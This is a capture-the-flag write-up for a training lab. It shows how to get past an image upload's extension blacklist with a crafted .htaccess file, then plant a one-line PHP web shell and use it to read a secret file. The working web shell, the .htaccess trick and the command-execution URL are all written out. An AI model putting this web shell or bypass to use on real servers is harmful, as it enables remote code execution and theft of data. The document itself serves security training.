## Web shell upload via extension blacklist bypass

This lab contains a vulnerable image upload function. Certain file extensions are blacklisted, but this defense can be bypassed due to a fundamental flaw in the configuration of this blacklist.

To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: wiener:peter

Hint :

You need to upload two different files to solve this lab.

## Notes

- Possibility to leave a comment on a post
- File Upload feature on user account


## Resume

1. Login with wiener:peter
2. Upload **.htaccess**
2. Upload **php** shell
3. RCE with **php** shell


## Solve 

The **file upload** feature is on `/my-account`, we have to login with wiener:peter. We can update our **Avatar** via file upload. We will upload our shell.php in order to RCE.

**shell.php**

```php
<?=`$_GET[0]`?>
```

If we try to uplad **.php** files we got an error : "Sorry, php files are not allowed Sorry, there was an error uploading your file."

With the hint : "You need to upload two different files to solve this lab.". This mean that we will need to upload something else before the shell.php. On way to update extension blacklist would be to upload a **.htaccess** file who allow php extension. 

**.htaccess** :

```
AddType application/x-httpd-php .php16      # Say all files with extension .php16 will execute PHP
```

We can now upload our **shell.php16** and bypass the blacklist. 

Once it's uploaded, we can right click over our avatar and open the "image" in new tab. In order to get `/home/carlos/secret` we can use the web shell : 

`/files/avatars/shell.php16?0=cat%20/home/carlos/secret` -> "ApQGc5igJTxvyv6cwPt5WBfkC5hDH5Gd"